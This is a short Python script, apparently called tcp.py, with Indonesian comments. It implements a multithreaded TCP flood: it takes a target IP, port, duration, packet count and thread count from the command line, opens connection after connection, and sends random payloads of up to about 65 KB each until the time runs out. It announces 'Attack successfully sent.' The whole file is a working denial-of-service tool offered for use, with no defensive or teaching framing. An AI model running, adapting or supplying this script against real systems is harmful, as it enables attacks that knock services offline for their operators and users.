from time import time as tt
import socket
import random
import os
import sys
import threading

def send_packets(ip, port, time, packet_size):
    startup = tt()
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            # Menghubungkan ke target
            sock.connect((ip, port))

            endtime = tt()
            if (startup + time) < endtime:
                break

            data = os.urandom(random.randint(500, 1024))  # Ukuran paket 500-1024 byte
            data2 = os.urandom(random.randint(1025, 65505))  # Ukuran paket 1025-65505 byte

            for _ in range(packet_size):
                sock.send(data)
                sock.send(data2)
        except Exception as e:
            print(f"Error sending packets: {e}")
        finally:
            sock.close()

def attack(ip, port, time, packet_size, threads):
    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))

    for _ in range(threads):
        th = threading.Thread(target=send_packets, args=(ip, port, time, packet_size))
        th.start()

    print('Attack successfully sent.')

if __name__ == '__main__':
    if len(sys.argv) != 6:
        print('Usage: python3 tcp.py <ip> <port> <time> <packet_size> <threads>')
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    time = int(sys.argv[3])
    packet_size = int(sys.argv[4])
    threads = int(sys.argv[5])

    try:
        attack(ip, port, time, packet_size, threads)
    except KeyboardInterrupt:
        print('Attack stopped.')
